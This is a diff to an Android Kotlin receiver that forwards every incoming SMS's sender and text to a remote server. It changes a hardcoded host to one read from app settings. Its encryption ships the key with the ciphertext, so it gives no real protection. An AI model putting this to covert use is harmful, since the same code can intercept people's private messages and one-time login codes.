@@ -25,49 +25,60 @@ import javax.crypto.spec.SecretKeySpec
 class SmsReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent) {
         if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION == intent.action) {
-            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
+            try {
+                val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
 
-            // Generate a key
-            val secretKey = CryptoUtils.generateKey()
-            val keyString = CryptoUtils.keyToString(secretKey)
+                val sharedPreferences = context.getSharedPreferences("AppSettings", Context.MODE_PRIVATE)
+                val endpoint = sharedPreferences.getString("api_endpoint", "")
+                val key = sharedPreferences.getString("api_key", "")
+                val secret = sharedPreferences.getString("api_secret", "")
 
-            Retrofit.Builder()
-                .baseUrl("https://www.tcom1.cyber32.net/api/")
-                .addConverterFactory(GsonConverterFactory.create())
-                .build()
-                .create(ApiService::class.java)
-                .sendBulk(messages.map {
-                    val encryptedMessageData = CryptoUtils.encrypt(it.messageBody, secretKey)
-                    val encryptedSenderData = CryptoUtils.encrypt(it.originatingAddress ?: "", secretKey)
-                    SmsData(
-                        encryptedSenderData.second,
-                        encryptedSenderData.first,
-                        encryptedMessageData.second,
-                        encryptedMessageData.first,
-                        keyString
-                    )
-                })
-                .enqueue(object : Callback<ResponseBody> {
+                if (endpoint.isNullOrEmpty() || key.isNullOrEmpty() || secret.isNullOrEmpty()) {
+                    Toast.makeText(context, "API endpoint, key, or secret not set", Toast.LENGTH_SHORT).show()
+                    return
+                }
+
+                // Generate a key
+                val secretKey = CryptoUtils.generateKey()
+                val keyString = CryptoUtils.keyToString(secretKey)
+
+                val retrofit = Retrofit.Builder()
+                    .baseUrl(if (endpoint.endsWith("/")) endpoint else "$endpoint/")
+                    .addConverterFactory(GsonConverterFactory.create())
+                    .build()
+
+                val apiService = retrofit.create(ApiService::class.java)
+
+                val bulkData = BulkData(
+                    keyString,
+                    messages.map {
+                        val (senderIv, encryptedSender) = CryptoUtils.encrypt(it.originatingAddress ?: "", secretKey)
+                        val (messageIv, encryptedMessage) = CryptoUtils.encrypt(it.messageBody, secretKey)
+                        SmsData("$senderIv:$encryptedSender", "$messageIv:$encryptedMessage")
+                    }
+                )
+
+                apiService.sendBulk(bulkData).enqueue(object : Callback<ResponseBody> {
                     override fun onResponse(call: Call<ResponseBody>, response: Response<ResponseBody>) {
                         // Handle response
-                        Log.d("SMS", "Sent to server")
+                        if (response.isSuccessful) {
+                            Log.d("SMS", "Sent to server successfully")
+                        } else {
+                            Log.e("SMS", "Failed to send to server: ${response.errorBody()?.string()}")
+                        }
                     }
 
                     override fun onFailure(call: Call<ResponseBody>, t: Throwable) {
                         // Handle failure
-                        Log.e("SMS", "Failed to send to server")
+                        Log.e("SMS", "Failed to send to server", t)
                     }
                 })
-            
-
-
-//            for (smsMessage in Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
-//                val messageBody = smsMessage.messageBody
-//                val sender = smsMessage.originatingAddress
-//                sendToServer(context, sender, messageBody)
-//            }
+            } catch (e: Exception) {
+                Log.e("SmsReceiver", "Exception caught while processing SMS", e)
+            }
         }
     }
+
 
     private fun sendToServer(context: Context, sender: String?, message: String) {
         Log.d("SMS", "Received from $sender: $message")
@@ -96,15 +107,17 @@ interface ApiService {
     fun sendSms(@Body smsData: SmsData): Call<ResponseBody>
 
     @POST("bulk")
-    fun sendBulk(@Body smsData: List<SmsData>): Call<ResponseBody>
+    fun sendBulk(@Body bulkData: BulkData): Call<ResponseBody>
 }
 
 data class SmsData(
-    val encryptedSender: String,
-    val senderIv: String,
-    val encryptedMessage: String,
-    val messageIv: String,
-    val key: String
+    val sender: String,
+    val message: String,
+)
+
+data class BulkData(
+    val key: String,
+    val messages: List<SmsData>
 )
 
 object CryptoUtils {
